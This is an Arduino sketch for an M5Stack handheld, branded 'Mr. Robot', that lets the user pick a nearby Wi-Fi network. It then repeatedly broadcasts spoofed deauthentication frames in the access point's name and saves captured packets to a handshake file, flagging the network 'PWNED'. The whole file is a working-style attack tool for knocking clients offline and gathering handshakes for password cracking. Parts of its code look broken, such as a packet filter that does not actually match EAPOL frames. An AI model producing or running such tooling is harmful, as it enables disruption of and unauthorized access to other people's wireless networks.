#include <M5Core2.h> // Use the appropriate library for M5Stack Cardputer
#include <WiFi.h>
#include <SD.h>
#include <SPI.h>
#include <esp_wifi.h>
#include <Wire.h>
#include <RTClib.h>

#define SD_CS_PIN 4
#define MAX_BUFFER_SIZE 16384
#define WIFI_CHANNEL_HOP_INTERVAL 10
#define DEAUTH_ATTACK_INTERVAL 5

struct Network {
    String ssid;
    bool pwned;
    uint8_t bssid[6];
};

Network currentNetwork;
bool networkSelected = false;
uint8_t *packetBuffer = nullptr;
int bufferIndex = 0;
int currentChannelIndex = 0;
int channels[] = {1, 6, 11};
int numChannels = sizeof(channels) / sizeof(channels[0]);

RTC_DS3231 rtc;

void setup() {
    M5.begin();
    showBootDisplay();

    // Initialize SD card
    if (!SD.begin(SD_CS_PIN)) {
        M5.Lcd.println("SD Card initialization failed!");
        while (1);
    }

    M5.Lcd.println("SD Card initialized.");

    // Initialize RTC
    Wire.begin();
    if (!rtc.begin()) {
        M5.Lcd.println("RTC failed");
        while (1);
    }
    if (rtc.lostPower()) {
        M5.Lcd.println("RTC lost power, setting time!");
        rtc.adjust(DateTime(F(__DATE__), F(__TIME__)));
    }

    // Scan for networks
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    int n = WiFi.scanNetworks();
    if (n == 0) {
        M5.Lcd.println("No networks found");
        while (1);
    } else {
        M5.Lcd.println("Networks found:");
        for (int i = 0; i < n; ++i) {
            M5.Lcd.printf("%d: %s (%d)\n", i + 1, WiFi.SSID(i).c_str(), WiFi.RSSI(i));
        }
        M5.Lcd.println("Enter network number:");
    }

    while (!networkSelected) {
        if (M5.BtnA.wasPressed()) selectNetwork(1);
        if (M5.BtnB.wasPressed()) selectNetwork(2);
        if (M5.BtnC.wasPressed()) selectNetwork(3);
        M5.update();
    }

    // Set WiFi to promiscuous mode
    WiFi.mode(WIFI_MODE_NULL);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);

    WiFi.scanNetworks(true, 10);
    M5.Lcd.println("Scanning networks...");
    hopToNextChannel();

    M5.Lcd.println("Sniffer initialized.");
}

void loop() {
    M5.update();

    static unsigned long lastChannelHopTime = 0;
    if (millis() - lastChannelHopTime > WIFI_CHANNEL_HOP_INTERVAL * 1000) {
        hopToNextChannel();
        lastChannelHopTime = millis();
    }

    static unsigned long lastDeauthAttackTime = 0;
    if (millis() - lastDeauthAttackTime > DEAUTH_ATTACK_INTERVAL * 1000) {
        sendDeauthAttack();
        lastDeauthAttackTime = millis();
    }
}

static esp_wifi_promiscuous_filter_t filter = {
    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
};

void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)pkt->payload;
    wifi_ieee80211_mac_hdr_t *hdr = &ipkt->hdr;

    if (isEAPOLPacket(hdr)) {
        addPacketToBuffer(pkt->payload, pkt->rx_ctrl.sig_len);
    }
}

bool isEAPOLPacket(wifi_ieee80211_mac_hdr_t *hdr) {
    return (hdr->frame_ctrl & 0x00c0) == 0x0080 && memcmp(hdr->addr3, currentNetwork.bssid, 6) == 0;
}

void addPacketToBuffer(const uint8_t *payload, int len) {
    if (!packetBuffer) {
        packetBuffer = (uint8_t *)malloc(MAX_BUFFER_SIZE);
        if (!packetBuffer) {
            M5.Lcd.println("Failed to allocate memory for packet buffer.");
            return;
        }
    }

    if (bufferIndex + len <= MAX_BUFFER_SIZE) {
        memcpy(packetBuffer + bufferIndex, payload, len);
        bufferIndex += len;
    } else {
        flushBufferToFile();
        memcpy(packetBuffer, payload, len);
        bufferIndex = len;
    }
}

void flushBufferToFile() {
    if (bufferIndex == 0) return;

    DateTime now = rtc.now();
    char timestamp[20];
    sprintf(timestamp, "%04d-%02d-%02d %02d:%02d:%02d",
            now.year(), now.month(), now.day(),
            now.hour(), now.minute(), now.second());

    File file = SD.open("/handshake.cap", FILE_APPEND);
    if (file) {
        file.print(timestamp);
        file.write(packetBuffer, bufferIndex);
        file.close();
        currentNetwork.pwned = true;
        displayNetworkStatus();
        bufferIndex = 0;
    } else {
        M5.Lcd.println("Failed to open file for writing.");
    }

    logCaptureEvent(timestamp, bufferIndex);
}

void logCaptureEvent(const char* timestamp, int packetSize) {
    File logFile = SD.open("/capture.log", FILE_APPEND);
    if (logFile) {
        logFile.printf("Timestamp: %s, Packet Size: %d\n", timestamp, packetSize);
        logFile.close();
    } else {
        M5.Lcd.println("Failed to open log file.");
    }
}

void displayNetworkStatus() {
    M5.Lcd.clear();
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(TFT_WHITE);
    M5.Lcd.printf("Monitoring network: %s\n", currentNetwork.ssid.c_str());
    if (currentNetwork.pwned) {
        M5.Lcd.println("Status: PWNED!");
    } else {
        M5.Lcd.println("Status: Not PWNED");
    }
}

void selectNetwork(int networkNumber) {
    int numNetworks = WiFi.scanNetworks();
    if (networkNumber > 0 && networkNumber <= numNetworks) {
        currentNetwork.ssid = WiFi.SSID(networkNumber - 1);
        memcpy(currentNetwork.bssid, WiFi.BSSID(networkNumber - 1), 6);
        currentNetwork.pwned = false;
        networkSelected = true;
        displayNetworkStatus();
    } else {
        M5.Lcd.println("Invalid network number");
    }
}

void hopToNextChannel() {
    esp_wifi_set_channel(channels[currentChannelIndex], WIFI_SECOND_CHAN_NONE);
    M5.Lcd.printf("Hopping to channel %d\n", channels[currentChannelIndex]);
    currentChannelIndex = (currentChannelIndex + 1) % numChannels;
}

void sendDeauthAttack() {
    const uint8_t deauthPacket[26] = {
        0xC0, 0x00, 0x3A, 0x01, // Frame control
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination address
        currentNetwork.bssid[0], currentNetwork.bssid[1], currentNetwork.bssid[2],
        currentNetwork.bssid[3], currentNetwork.bssid[4], currentNetwork.bssid[5], // Source address (BSSID)
        currentNetwork.bssid[0], currentNetwork.bssid[1], currentNetwork.bssid[2],
        currentNetwork.bssid[3], currentNetwork.bssid[4], currentNetwork.bssid[5], // BSSID
        0x00, 0x00, // Sequence number
        0x07, 0x00, // Reason code (Class 3 frame received from nonassociated STA)
    };

    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
}

void showBootDisplay() {
    M5.Lcd.fillScreen(TFT_BLACK);
    M5.Lcd.setTextColor(TFT_RED);
    M5.Lcd.setTextSize(2);
    M5.Lcd.setCursor(20, 100);
    M5.Lcd.println("Mr. Robot");
    delay(2000);
    M5.Lcd.fillScreen(TFT_BLACK);
}
